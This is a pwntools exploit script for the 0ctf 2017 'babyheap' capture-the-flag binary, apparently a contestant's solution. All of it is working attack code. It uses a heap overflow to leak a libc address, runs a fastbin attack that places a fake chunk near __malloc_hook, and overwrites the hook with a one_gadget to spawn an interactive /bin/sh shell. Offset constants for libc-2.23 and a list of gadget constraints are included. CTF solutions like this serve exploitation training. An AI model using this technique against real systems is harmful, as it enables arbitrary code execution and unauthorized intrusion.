from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])



io=process("./babyheap_0ctf_2017")
# io=remote("node4.buuoj.cn",26939)
elf=ELF("./babyheap_0ctf_2017")
libc=ELF("./libc-2.23.so")

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
main_arena_off=0x3C4B20
fake_chunk_off=0x3c4aed

def alloc(n):
    io.recvuntil(b"Command: ")
    io.sendline(b"1")
    io.recvuntil(b"Size: ")
    io.sendline(str(n))

def fill(n,s,m):
    io.recvuntil(b"Command: ")
    io.sendline(b"2")
    io.recvuntil(b"Index: ")
    io.sendline(str(n))
    io.recvuntil(b"Size: ")
    io.sendline(str(s))
    io.recvuntil(b"Content: ")
    io.send(m)

def free(n):
    io.recvuntil(b"Command: ")
    io.sendline(b"3")
    io.recvuntil(b"Index: ")
    io.sendline(str(n))

def dump(n):
    io.recvuntil(b"Command: ")
    io.sendline(b"4")
    io.recvuntil(b"Index: ")
    io.sendline(str(n))
    io.recvuntil(b"Content: \n")


alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x10)
alloc(0x80)

free(1)
free(2)

payload=b"a"*16+p64(0)+p64(0x21)+b"a"*16+p64(0)+p64(0x21)+p8(0x80)
fill(0,len(payload),payload)


payload=b"a"*16+p64(0)+p64(0x21)
fill(3,len(payload),payload)


alloc(0x10)  #allocate chunk2
alloc(0x10) #allocate chunk4

payload=b"a"*16+p64(0)+p64(0x91)
fill(3,len(payload),payload)

alloc(0x80)
free(4)

gdb.attach(io)
pause()

dump(2)
leak_addr=u64(io.recvuntil(b"\x7f").ljust(8,b"\x00"))
libc_addr=leak_addr-main_arena_off-0x58
fake_chunk=libc_addr+fake_chunk_off
malloc_hook=libc_addr+libc.sym[b"__malloc_hook"]
shell=one_gadget[1]+libc_addr
print("leak_addr:  "+hex(leak_addr))
print("libc_addr:  "+hex(libc_addr))
print("fake_chunk:  "+hex(fake_chunk))
print("malloc_hook:  "+hex(malloc_hook))
print("shell:  "+hex(shell))





alloc(0x60) #fast chunk
free(4) #into fast bin
payload=p64(fake_chunk)
fill(2,len(payload),payload)


alloc(0x60) #chunk 4
alloc(0x60) #chunk 6
payload=cyclic(0x13)+p64(shell)
fill(6,len(payload),payload)
alloc(0x100)

io.interactive()


# 0x45216 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL